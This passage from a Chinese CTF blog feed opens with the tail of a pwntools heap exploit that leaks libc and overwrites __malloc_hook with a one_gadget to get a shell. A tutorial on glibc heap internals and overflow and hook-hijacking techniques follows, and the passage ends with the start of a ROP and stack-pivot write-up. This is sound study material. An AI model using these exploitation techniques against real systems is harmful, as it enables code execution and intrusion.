class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>,payload)<br><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#chunk1</span><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#在chunk4上叠上了chunk2</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>,payload)<br>allocate(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#chunk5，防止chunk4与top chunk合并</span><br>free(<span class="hljs-number">4</span>)<br>leak_base=u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>])<br>libc_base=leak_base-<span class="hljs-number">0x3c4b78</span><br>malloc_hook=libc_base+<span class="hljs-number">0x3c4b10</span><br>log.info(<span class="hljs-string">&quot;leak address:0x%x&quot;</span> %leak_base)<br>log.info(<span class="hljs-string">&quot;libc base:0x%x&quot;</span> %libc_base)<br>log.info(<span class="hljs-string">&quot;__malloc_hook:0x%x&quot;</span> %malloc_hook)<br><br>allocate(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">4</span>)<br>payload=p64(malloc_hook-<span class="hljs-number">0x20</span>+<span class="hljs-number">0xd</span>)<br>fill(<span class="hljs-number">2</span>,payload)<br>allocate(<span class="hljs-number">0x60</span>)<br><br>allocate(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#malloc附近的chunk6</span><br>one_gadget=libc_base+<span class="hljs-number">0x4526a</span><br><br>payload=p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(one_gadget)<br>fill(<span class="hljs-number">6</span>,payload)<br>allocate(<span class="hljs-number">0x1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<p>结语：总算艰苦的完成了第一道的堆题，其中的艰难就不再多说了。更多的还是喜悦吧，万事开头难，跨入了这道坎，后面可能也许大概会容易些吧</p>
]]></content>
  </entry>
  <entry>
    <title>初探堆</title>
    <url>/2021/04/10/2021-04-10-%E5%88%9D%E6%8E%A2%E5%A0%86/</url>
    <content><![CDATA[<h1 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h1><h4 id="知识来源处："><a href="#知识来源处：" class="headerlink" title="知识来源处："></a>知识来源处：</h4><ul>
<li>CTF pwn 中最通俗易懂的堆入坑指南<a href="https://www.anquanke.com/post/id/163971">https://www.anquanke.com/post/id/163971</a></li>
<li>CTF Wiki<a href="https://wiki.x10sec.org/pwn/linux/glibc-heap/heap_overview-zh/">https://wiki.x10sec.org/pwn/linux/glibc-heap/heap_overview-zh/</a></li>
</ul>
<h3 id="linux下的堆"><a href="#linux下的堆" class="headerlink" title="linux下的堆"></a>linux下的堆</h3><p>堆不同于栈，堆是动态分配的（由操作系统内核或者堆管理器），只有在程序中需要时才会分配。栈是程序加载进内存后就会出现，而堆是由 malloc、alloc、realloc 函数分配内存后才会出现。</p>
<p>堆其实就是程序虚拟地址空间的一块连续的线性区域，其生长方向是从<strong>低地址向高地址生长的</strong>，与栈的从高地址向低地址生长是不同的。内核一般都会预先分配很大的一块连续的内存，因此堆可以申请到的内存空间比栈要大很多，然后让堆管理器通过某种算法管理这块内存。对堆操作的<strong>是由堆管理器（ptmalloc2）来实现的，而不是操作系统内核</strong>。因为如果程序每次申请或者释放堆时都需要进行系统调用，系统调用的开销巨大，当频繁进行堆操作时，就会严重影响程序的性能</p>
<p>目前 Linux 标准发行版中使用的堆分配器是 glibc 中的堆分配器：ptmalloc2。ptmalloc2 主要是通过 malloc/free 函数来分配和释放内存块。在内存分配与使用的过程中，Linux 有这样的一个基本内存管理思想，<strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。</p>
<h4 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h4><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">函数原型<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">brk</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *addr)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">sbrk</span><span class="hljs-params">(<span class="hljs-keyword">intptr_t</span> increment)</span></span>;<br></code></pre></td></tr></table></figure>

<p>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加 brk的大小来向操作系统申请内存。</p>
<p>初始时，堆的起始地址 start_brk 以及堆的当前末尾 brk 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同</p>
<ul>
<li>不开启 ASLR 保护时，start_brk 以及 brk 会指向 data/bss 段的结尾。</li>
<li>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。</li>
</ul>
<p>brk和sbrk会改变program break的位置(在heap后的那块区域)，brk通过传递的addr来重新设置program break，成功则返回0，否则返回-1。而sbrk用来增加heap，增加的大小通过参数increment决定，返回增加大小<strong>前</strong>的heap的program break，如果increment为0则返回program break</p>
<p>大部分我们使用的是malloc和free函数来分配和释放内存，而brk和sbrk分配的堆空间类似于缓冲池（这个缓冲池的大小比malloc所设置的更大），每次malloc从缓冲池获得内存，如果缓冲池不够了，再调用brk或sbrk扩充缓冲池，直到达到缓冲池大小的上限，free则将应用程序使用的内存空间归还给缓冲池。</p>
<p><img src="/2021/04/10/2021-04-10-%E5%88%9D%E6%8E%A2%E5%A0%86/program_virtual_address_memory_space.png"></p>
<h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><p>malloc 会使用 mmap 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用。</p>
<p>可以用munmap函数清除mmap的匿名映射段</p>
<h4 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h4><p><strong>许多时候程序可能只是向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存分配给程序。这样的话，就避免了多次内核态与用户态的切换，提高了程序的效率。</strong>我们称这一块连续的内存区域为 arena。此外，我们称由主线程申请的内存为main_arena。后续的申请的内存会一直从这个 arena 中获取，直到空间不足。当 arena 空间不足时，它可以通过增加 brk 的方式来增加堆的空间。类似地，arena 也可以通过减小 brk 来缩小自己的空间。</p>
<p><strong>在主线程释放内存后</strong>，其对应的 arena 并没有进行回收，而是交由 glibc 来进行管理。当后面程序再次申请内存时，在 glibc 中管理的内存充足的情况下，glibc 就会根据堆分配的算法来给程序分配相应的内存。</p>
<p>注：当用户请求的内存大于 128KB 时，并且没有任何 arena 有足够的空间时，那么系统就会执行 mmap 函数来分配相应的内存空间。这与这个请求来自于主线程还是从线程无关。</p>
<h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>（转载自ctf-wiki<a href="https://wiki.x10sec.org/pwn/linux/glibc-heap/heapoverflow_basic-zh/%EF%BC%89">https://wiki.x10sec.org/pwn/linux/glibc-heap/heapoverflow_basic-zh/）</a></p>
<p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（<strong>之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数</strong>），因而导致了数据溢出，并覆盖到<strong>物理相邻的高地址</strong>的下一个堆块。</p>
<p>不难发现，堆溢出漏洞发生的基本前提是</p>
<ul>
<li>程序向堆上写入数据。</li>
<li>写入的数据大小没有被良好地控制。</li>
</ul>
<p>对于攻击者来说，堆溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程。</p>
<p>堆溢出是一种特定的缓冲区溢出（还有栈溢出， bss 段溢出等）。但是其与栈溢出所不同的是，堆上并不存在返回地址等可以让攻击者直接控制执行流程的数据，因此我们一般无法直接通过堆溢出来控制 EIP 。一般来说，我们利用堆溢出的策略是</p>
<ol>
<li>覆盖与其<strong>物理相邻的下一个 chunk</strong> 的内容。<ul>
<li>  prev_size</li>
<li>size，主要有三个比特位，以及该堆块真正的大小。<ul>
<li>  NON_MAIN_ARENA </li>
<li>  IS_MAPPED  </li>
<li>  PREV_INUSE </li>
<li>  the True chunk size</li>
</ul>
</li>
<li>  chunk content，从而改变程序固有的执行流。</li>
</ul>
</li>
<li> 利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。</li>
</ol>
<h2 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h2><p>下面我们举一个简单的例子：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *chunk;<br>  chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get input:&quot;</span>);<br>  <span class="hljs-built_in">gets</span>(chunk);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这个程序的主要目的是调用 malloc 分配一块堆上的内存，之后向这个堆块中写入一个字符串，如果输入的字符串过长会导致溢出 chunk 的区域并覆盖到其后的 top chunk 之中(实际上 puts 内部会调用 malloc 分配堆内存，覆盖到的可能并不是 top chunk)。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x602000</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000021</span> &lt;===chunk<br><span class="hljs-attribute">0x602010</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x602020</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000020</span>fe<span class="hljs-number">1</span> &lt;===top chunk<br><span class="hljs-attribute">0x602030</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x602040</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br></code></pre></td></tr></table></figure>

<p>print ‘A’*100<br>进行写入</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x602000</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000021</span> &lt;===chunk<br><span class="hljs-attribute">0x602010</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">4141414141414141</span>	<span class="hljs-number">0</span>x<span class="hljs-number">4141414141414141</span><br><span class="hljs-attribute">0x602020</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">4141414141414141</span>	<span class="hljs-number">0</span>x<span class="hljs-number">4141414141414141</span> &lt;===top chunk(已被溢出)<br><span class="hljs-attribute">0x602030</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">4141414141414141</span>	<span class="hljs-number">0</span>x<span class="hljs-number">4141414141414141</span><br><span class="hljs-attribute">0x602040</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">4141414141414141</span>	<span class="hljs-number">0</span>x<span class="hljs-number">4141414141414141</span><br></code></pre></td></tr></table></figure>


<h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>堆溢出中比较重要的几个步骤:</p>
<h3 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h3><p>通常来说堆是通过调用 glibc 函数 malloc 进行分配的，在某些情况下会使用 calloc 分配。calloc 与 malloc 的区别是 <strong>calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的</strong>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-comment">//等同于</span><br>ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-built_in">memset</span>(ptr,<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>);<br></code></pre></td></tr></table></figure>

<p>除此之外，还有一种分配是经由 realloc 进行的，realloc 函数可以身兼 malloc 和 free 两个函数的功能。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *chunk,*chunk1;<br>  chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);<br>  chunk1=<span class="hljs-built_in">realloc</span>(chunk,<span class="hljs-number">32</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>realloc的操作并不是像字面意义上那么简单，其内部会根据不同的情况进行不同操作</p>
<ul>
<li>当realloc(ptr,size)的size不等于ptr的size时<ul>
<li>如果申请size&gt;原来size<ul>
<li>  如果chunk与top chunk相邻，直接扩展这个chunk到新size大小</li>
<li>  如果chunk与top chunk不相邻，相当于free(ptr),malloc(new_size) </li>
</ul>
</li>
<li>如果申请size&lt;原来size<ul>
<li>  如果相差不足以容得下一个最小chunk(64位下32个字节，32位下16个字节)，则保持不变</li>
<li>  如果相差可以容得下一个最小chunk，则切割原chunk为两部分，free掉后一部分</li>
</ul>
</li>
</ul>
</li>
<li>  当realloc(ptr,size)的size等于0时，相当于free(ptr)</li>
<li>  当realloc(ptr,size)的size等于ptr的size，不进行任何操作</li>
</ul>
<h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>通过寻找危险函数，我们快速确定程序是否可能有堆溢出，以及有的话，堆溢出的位置在哪里。</p>
<p>常见的危险函数如下</p>
<ul>
<li>输入<ul>
<li>  gets，直接读取一行，忽略 <code>&#39;\x00&#39;</code></li>
<li>  scanf</li>
<li>  vscanf</li>
</ul>
</li>
<li>输出<ul>
<li>  sprintf</li>
</ul>
</li>
<li>字符串<ul>
<li>  strcpy，字符串复制，遇到 <code>&#39;\x00&#39;</code> 停止</li>
<li>  strcat，字符串拼接，遇到 <code>&#39;\x00&#39;</code> 停止</li>
<li>  bcopy，将字符串src的前n个字节复制到dest中，并且不检查’\x00’</li>
</ul>
</li>
</ul>
<h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算<strong>我们开始写入的地址与我们所要覆盖的地址之间的距离</strong>。<br>一个常见的误区是malloc的参数等于实际分配堆块的大小，但是事实上 ptmalloc 分配出来的大小是对齐的。这个长度一般是字长的2倍，比如32位系统是8个字节，64位系统是16个字节。但是对于不大于2倍字长的请求，malloc会直接返回2倍字长的块也就是最小chunk，比如64位系统执行<code>malloc(0)</code>会返回用户区域为16字节的块。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *chunk;<br>  chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get input:&quot;</span>);<br>  <span class="hljs-built_in">gets</span>(chunk);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight dns"><table><tr><td class="code"><pre><code class="hljs dns">//根据系统的位数，malloc会分配<span class="hljs-number">8</span>或<span class="hljs-number">16</span>字节的用户空间<br><span class="hljs-number">0x602000</span>:	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x602010</span>:	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>	<span class="hljs-number">0</span>x0000000000020fe1<br><span class="hljs-number">0x602030</span>:	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure>

<p>注意用户区域的大小不等于 chunk_hear.size，chunk_hear.size=用户区域大小+2*字长</p>
<p>还有一点是之前所说的用户申请的内存大小会被修改，其有可能会使用与其物理相邻的下一个chunk的prev_size字段储存内容。回头再来看下之前的示例代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *chunk;<br>  chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get input:&quot;</span>);<br>  <span class="hljs-built_in">gets</span>(chunk);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>观察如上代码，我们申请的chunk大小是24个字节。但是我们将其编译为64位可执行程序时，实际上分配的内存会是16个字节而不是24个。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x602000</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000021</span><br><span class="hljs-attribute">0x602010</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x602020</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000020</span>fe<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>16个字节的空间是如何装得下24个字节的内容呢？答案是借用了下一个块的pre_size域。我们可来看一下用户申请的内存大小与glibc中实际分配的内存大小之间的转换。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* pad request bytes into a usable size -- internal version */</span><br><span class="hljs-comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> request2size(req)                                                      \</span><br><span class="hljs-meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="hljs-meta">         ? MINSIZE                                                             \</span><br><span class="hljs-meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></code></pre></td></tr></table></figure>

<p>当req=24时，request2size(24)=32。而除去chunk 头部的16个字节。实际上用户可用chunk的字节数为16。而根据我们前面学到的知识可以知道chunk的pre_size仅当它的前一块处于释放状态时才起作用。所以用户这时候其实还可以使用下一个chunk的prev_size字段，正好24个字节。<strong>实际上 ptmalloc 分配内存是以双字为基本单位，以64位系统为例，分配出来的空间是16的整数倍，即用户申请的chunk都是16字节对齐的。</strong></p>
<h2 id="相关函数知识"><a href="#相关函数知识" class="headerlink" title="相关函数知识"></a>相关函数知识</h2><p>1、<strong>mmap</strong></p>
<p>函数原型为<em><em>void</em> mmap(void</em> start,size_t length,int prot,int flags,int fd,off_t offset)**  功能为：mmap将一个文件或者其它对象映射进内存。文件被<strong>映射</strong>到多个页上，如果文件的大小不是所有页的大小之和，最后一个页剩下的空间（未使用的）将会清零。mmap创建的chunk紧邻libc</p>
<p>条件：mmap()必须以PAGE_SIZE为单位进行映射，而内存也只能以页为单位（32位系统中页为4k字节）进行映射，若要映射非PAGE_SIZE整数倍的地址范围，要先进行内存对齐，强行以PAGE_SIZE的倍数大小进行映射。</p>
<p>参数说明：</p>
<p>start：映射区的开始地址，设置为0时表示由系统决定映射区的起始地址。</p>
<p>length：映射区的长度。//长度单位是 以字节为单位，不足一内存页按一内存页处理</p>
<p>prot：期望的内存保护标志，不能与文件的打开模式冲突。是以下的某个值，可以通过or运算合理地组合在一起</p>
<p>PROT_EXEC //页内容可以被执行（值为1）</p>
<p>PROT_READ //页内容可以被读取（值为4）</p>
<p>PROT_WRITE //页可以被写入（值为2）</p>
<p>PROT_NONE //页不可访问</p>
<p>flags：指定映射对象的类型，映射选项和映射页是否可以共享。它的值可以是一个或者多个以下位的组合体：</p>
<p>MAP_FIXED //使用指定的映射起始地址，如果由start和len参数指定的内存区重叠于现存的映射空间，重叠部分将会被丢弃。如果指定的起始地址不可用，操作将会失败。并且起始地址必须落在页的边界上。</p>
<p>MAP_SHARED //与其它所有映射这个对象的进程共享映射空间。对共享区的写入，相当于输出到文件。直到**msync()<strong>或者</strong>munmap()**被调用，文件实际上不会被更新。</p>
<p>MAP_PRIVATE //建立一个写入时拷贝的私有映射。内存区域的写入不会影响到原文件。这个标志和以上标志是互斥的，只能使用其中一个。</p>
<p>MAP_DENYWRITE //这个标志被忽略。</p>
<p>MAP_EXECUTABLE //同上</p>
<p>MAP_NORESERVE //不要为这个映射保留交换空间。当交换空间被保留，对映射区修改的可能会得到保证。当交换空间不被保留，同时内存不足，对映射区的修改会引起段违例信号。</p>
<p>MAP_LOCKED //锁定映射区的页面，从而防止页面被交换出内存。</p>
<p>MAP_GROWSDOWN //用于堆栈，告诉内核VM系统，映射区可以向下扩展。</p>
<p>MAP_ANONYMOUS //匿名映射，映射区不与任何文件关联。</p>
<p>MAP_ANON //MAP_ANONYMOUS的别称，不再被使用。</p>
<p>MAP_FILE //兼容标志，被忽略。</p>
<p>MAP_32BIT //将映射区放在进程地址空间的低2GB，MAP_FIXED指定时会被忽略。当前这个标志只在x86-64平台上得到支持。</p>
<p>MAP_POPULATE //为文件映射通过预读的方式准备好页表。随后对映射区的访问不会被页违例阻塞。</p>
<p>MAP_NONBLOCK //仅和MAP_POPULATE一起使用时才有意义。不执行预读，只为已存在于内存中的页面建立页表入口。</p>
<p>fd：有效的文件描述词。一般是由**open()**函数返回，其值可以设置为-1，此时需要指定flags参数中的MAP_ANONYMOUS，表明进行的是匿名映射。</p>
<p>offset：被映射对象内容的起点。</p>
<p>成功执行时，mmap()返回被映射区的指针，munmap()返回0。失败时，mmap()返回MAP_FAILED[其值为(void *)-1]，munmap返回-1。</p>
<p>注：（（void*）-1） ：一个某类型指针类型，指向地址为0xffffffff，无效地址，表明错误</p>
<p>映射建立之后，即使文件关闭，映射依然存在。因为映射的是磁盘的地址，不是文件本身，和文件句柄无关。同时可用于进程间通信的有效地址空间不完全受限于被映射文件的大小，因为是按页映射。</p>
<p>2、<strong>munmap</strong></p>
<p>函数原型为<em><em>int munmap(void</em> start,size_t length)</em>* 用来取消参数start所指的映射内存起始地址，参数length则是欲取消的内存大小。当进程结束或利用exec相关函数来执行其他程序时，映射内存会自动解除，但关闭对应的文件描述符时不会解除映射。</p>
<p>addr是调用mmap()时返回的地址，len是映射区的大小；当映射关系解除后，对原来映射地址的访问将导致段错误发生。 </p>
<p>3、<strong>msync</strong></p>
<p>函数原型为**int msync( void *addr, size_t len, int flags )**，一般说来，进程在映射空间的对共享内容的改变并不直接写回到磁盘文件中，往往在调用munmap（）后才执行该操作。</p>
<p>可以通过调用msync()实现磁盘上文件内容与共享内存区的内容一致。</p>
<p>4、<strong>malloc</strong></p>
<p>函数原型为**void *malloc(unsigned int size)**；其作用是在内存的动态存储区中分配一个长度为size的连续空间。此函数的返回值是分配区域的起始地址，或者说，此函数是一个指针型函数，返回的指针指向该分配域的开头位置。</p>
<p>分配成功则返回指向被分配内存的指针(此存储区中的初始值不确定)，否则返回空指针NULL。当动态内存不再使用时，应使用free()函数将内存块释放。</p>
<ul>
<li>当 size=0 时，返回当前系统允许的堆的最小内存块。</li>
<li>当 size 为负数时，由于在大多数系统上，<strong>size_t 是无符号数（这一点非常重要）</strong>，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。</li>
</ul>
<p>5、<strong>free</strong></p>
<p>函数原型为**void free(void *ptr) **是C语言中释放内存空间的函数，通常与申请内存空间的函数malloc()结合使用，可以释放由 malloc()、calloc()、realloc() 等函数申请的内存空间。</p>
<p>ptr– 指针指向一个要释放内存的内存块，该内存块之前是通过调用 malloc、calloc 或 realloc 进行分配内存的。如果传递的参数是一个空指针，则不会执行任何动作。free函数不返回任何值</p>
<p>当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 <code>double free</code></p>
<p>6、**__free_hook**</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">void</span> __libc_free (<span class="hljs-keyword">void</span> *mem)<br>&#123;<br>  mstate ar_ptr;<br>  mchunkptr p;                          <span class="hljs-comment">/* chunk corresponding to mem */</span><br><br>  <span class="hljs-built_in"><span class="hljs-keyword">void</span></span> (*hook) (<span class="hljs-keyword">void</span> *, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)<br>    = <span class="hljs-built_in">atomic_forced_read</span> (__free_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      (*hook)(mem, <span class="hljs-built_in">RETURN_ADDRESS</span> (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>上面的代码对是 free() 函数的一部分，可以看出程序先把全局变量 __free_hook 赋给了局部变量 hook ，然后对 hook 是否为 NULL 进行判断，如果不为空，则执行 hook ，第一个参数就是 chunk 的内容部分。</p>
<p>一般的情况下 __free_hook 是为 NULL 的，所以是不会执行的，但是如果有人恶意修改 __free_hook 的话，就会造成 __free_hook 劫持</p>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>buu</title>
    <url>/2021/04/07/2021-04-07-buu03/</url>
    <content><![CDATA[<h1 id="buu——pwn学习"><a href="#buu——pwn学习" class="headerlink" title="buu——pwn学习"></a>buu——pwn学习</h1><p>有些题目不小心删了，hhh不过也不重要了，就算是第十题开始的吧（虽然应该是不止的）</p>
<h3 id="十、铁人三项-第五赛区-2018-rop"><a href="#十、铁人三项-第五赛区-2018-rop" class="headerlink" title="十、铁人三项(第五赛区)_2018_rop"></a>十、铁人三项(第五赛区)_2018_rop</h3><p>checksec一下，开启了nx保护，然后拖入ida</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210407213546.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210407213807.png"></p>
<p>呃。。。应该就是比较熟悉的rop的构建了，直接上exp吧，这类题目做挺多的了：</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210407220012.png"></p>
<h3 id="十一、gyctf-2020-borrowstack"><a href="#十一、gyctf-2020-borrowstack" class="headerlink" title="十一、gyctf_2020_borrowstack"></a>十一、gyctf_2020_borrowstack</h3><p>先做下这题，一直想完整的了解栈迁移，借着这题真正的掌握栈迁移的手法和知识点吧，先checksec一下，再拖入ida分析</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210407220304.png"></p>
<p>里面很简单，没有什么复杂的函数，很适合借此了解栈迁移！首先read函数读取的字节数不够，只能够刚好覆盖返回地址。第二输入点的位置是bss段上，不是栈。所以这时候就是要把栈迁移到这里，因为在这里我们可以有足够的输入构建系统函数调用shell</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210407220423.png"></p>
<p>这题太坑了！！！！！！！！！！！！！首先，你如果使用了system函数调用/bin/sh，这时候无论你选择哪个版本的libc都无法成功获取shell！网上的师傅们好像也是这样，原因都只是模糊的说猜测是因为栈迁移的位置太靠近一些重要数据，可能还是影响到了什么东西。都采取了one_gadget的办法，这里我同样踩坑！</p>
